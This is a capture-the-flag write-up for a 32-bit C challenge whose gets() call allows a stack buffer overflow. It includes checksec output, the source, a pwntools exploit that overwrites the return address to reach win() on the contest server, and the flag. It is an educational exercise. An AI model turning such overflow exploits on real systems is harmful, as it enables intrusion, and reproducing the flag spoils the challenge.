# This outta be large enough right?

## Challenge

We're given a small C binary with source code.

### Checksec

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### chall.c

```c
#include <stdio.h>
#include <stdlib.h>
__asm__(".symver realpath,realpath@GLIBC_2.0.5");
void win(){
    printf("Here is your flag:\n");
    exit(0);
}
void vuln(){
  char buf[56];
  gets(buf);
}
int main(){
  vuln();
  return 0;
}
```

## Solution

The call to `gets` means we have a trivial buffer overflow.

PIE is off and there is no canary, so we can overwrite the return address with the address of the `win` function.

## Exploit

```py
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('chall')

host = args.HOST or 'srv1.2023.magpiectf.ca'
port = int(args.PORT or 6201)

io = connect(host, port)

io.sendline(flat({0x44: exe.sym['win']}))

io.interactive()
```

## Flag

```
magpie{0mn1_fl4g_3v3rywh3r3}
```
